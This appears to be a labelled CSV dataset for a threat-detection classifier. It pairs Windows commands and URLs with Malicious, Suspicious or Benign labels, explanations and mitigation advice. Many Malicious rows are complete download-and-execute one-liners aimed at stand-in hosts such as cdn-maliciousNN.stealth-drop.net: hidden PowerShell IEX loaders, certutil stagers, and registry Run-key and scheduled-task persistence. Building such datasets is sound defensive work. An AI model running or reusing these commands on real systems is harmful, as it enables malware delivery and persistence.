Prompt,Label,Explanation,Recommendation
"powershell -w hidden -c ""&{(New-Object Net.WebClient).DownloadString('http://evilcdn69.stealth.biz/loader.ps1')}""",Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
mkdir C:\Data\Reports\Q36,Benign,Benign system usage or documentation activity — no malicious characteristics.,No action needed.
vfw12062.org/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
Invoke-WebRequest -Uri http://evilcdn31.stealth.biz/loader.ps1 -OutFile C:\Users\Public\loader.ps1; powershell -ExecutionPolicy Bypass -File C:\Users\Public\loader.ps1,Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
brabazonarchive.com/Pages/Swinford%20Geno.htm,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
Get-WmiObject Win32_LogicalDisk,Suspicious,Collects system or network information often used in environment enumeration or lateral movement planning.,"Log WMI, network, and identity queries from unusual users or hosts."
"schtasks /create /tn ""Updater"" /tr ""powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evilcdn61.stealth.biz/loader.ps1')"" /sc daily /st 00:00",Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
Invoke-WebRequest -Uri http://evilcdn11.stealth.biz/loader.ps1 -OutFile C:\Users\Public\loader.ps1; powershell -ExecutionPolicy Bypass -File C:\Users\Public\loader.ps1,Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
"powershell -w hidden -c ""&{(New-Object Net.WebClient).DownloadString('http://evilcdn70.stealth.biz/loader.ps1')}""",Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
"powershell -w hidden -c ""&{(New-Object Net.WebClient).DownloadString('http://evilcdn66.stealth.biz/loader.ps1')}""",Malicious,"Downloads and executes a script through stealthy PowerShell methods, typical of real-world malware loaders.","Block execution of unsigned scripts, inspect scheduled tasks, and investigate registry autoruns."
query user,Suspicious,Collects system or network information often used in environment enumeration or lateral movement planning.,"Log WMI, network, and identity queries from unusual users or hosts."
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious44.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
echo 'Test complete' > test21.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
canada.greekreporter.com/2011/08/20/three-greek-movies-at-the-35th-international-film-festival-in-montreal/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
volleyballnow.net/boys-club/college-choices/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious30.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
mkdir C:\Logs\Q11,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
http://www.aktivregion-ostseekueste.de/service/downloads.html,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious32.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
cmd.exe /c curl http://cdn-malicious51.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious35.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
cmd.exe /c curl http://cdn-malicious63.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious19.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
systeminfo > sysinfo_20.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
cmd.exe /c curl http://cdn-malicious68.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
http://www.fredhopper.com/index.php?option=com_content&view=category&id=66&Itemid=95,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
certutil -urlcache -split -f http://cdn-malicious45.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious75.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
dogsey.com/showthread.php?t=72452&page=10,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
content.usatoday.com/community/tags/topic.aspx?req=tag&tag=Mayor%20Mark%20Funkhouser,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
cmd.exe /c curl http://cdn-malicious31.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious40.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
mkdir C:\Logs\Q7,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious54.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
cmd.exe /c curl http://cdn-malicious49.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
http://correios.com.br/sobre-correios/a-empresa/publicacoes/processos-de-contas-anuais,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious7.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
bugs.centos.org/view.php?id=3156,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
cmd.exe /c curl http://cdn-malicious50.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious39.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
systeminfo > sysinfo_3.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious37.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious25.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious41.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious24.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious78.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious14.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious59.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
manta.com/c/mtcnqmn/mcgill-institute,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious65.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
http://www.resurrectionbellevue.org/index.php/education,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
http://bdata.nl/index.php?option=com_content&view=article&id=81:hewlett-packard&catid=37&Itemid=64,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious62.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
systeminfo > sysinfo_16.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
certutil -urlcache -split -f http://cdn-malicious79.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
peterblackshaw.com.au/buy/search,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious74.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious42.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
twitter.com/LoHud/status/132345728247926784,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious53.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
prnewswire.com/news-releases/3ality-digital-to-showcase-its-leading-s3d-broadcast-production-technology-and-premium-content-throughout-national-association-of-broadcasters-nab-show-89628362.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
baseball1976.blogspot.com/2010/01/1976-topps-315-al-hrabosky.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious70.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
cmd.exe /c curl http://cdn-malicious15.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious56.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"http://torontochieftains.com/component/option,com_jevents/Itemid,29/day,09/evid,31/month,02/task,icalrepeat.detail/title,indoor-training/uid,4ea224ad79844c90de9e72bbf34bfc05/year,2013/index.html",Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
cmd.exe /c curl http://cdn-malicious22.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious58.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
http://www.alexanderstiftung.de/index.php?option=com_content&view=section&layout=blog&id=3&Itemid=4,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
echo 'Test complete' > test37.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
certutil -urlcache -split -f http://cdn-malicious60.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious29.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious11.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious28.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious6.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious16.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious13.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious55.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
cmd.exe /c curl http://cdn-malicious61.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious27.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious3.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious1.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious38.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious52.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
cmd.exe /c curl http://cdn-malicious12.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
mkdir C:\Logs\Q4,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious47.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
music.yahoo.com/luba/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
njtransit.com/sf/sf_servlet.srv?hdnPageAction=BusSchedulesTo,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious4.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
http://www.kospel.pl/ru/produkty/kolektory-sloneczne.html,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
cmd.exe /c curl http://cdn-malicious73.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious10.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
http://fischereiverein.org/bildergalerie/category/42-faenge-juni-2010,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
echo 'Test complete' > test6.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious64.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
americasmiles.com/profiles/illinois/orland-park/dr-robert-l-tentler.php,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
echo 'Test complete' > test17.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
http://dyetr.com/index.php?option=com_content&view=article&id=73:8m&catid=39:yerel-hizmetici&Itemid=61,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
echo 'Test complete' > test32.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
systeminfo > sysinfo_10.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
mkdir C:\Logs\Q0,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
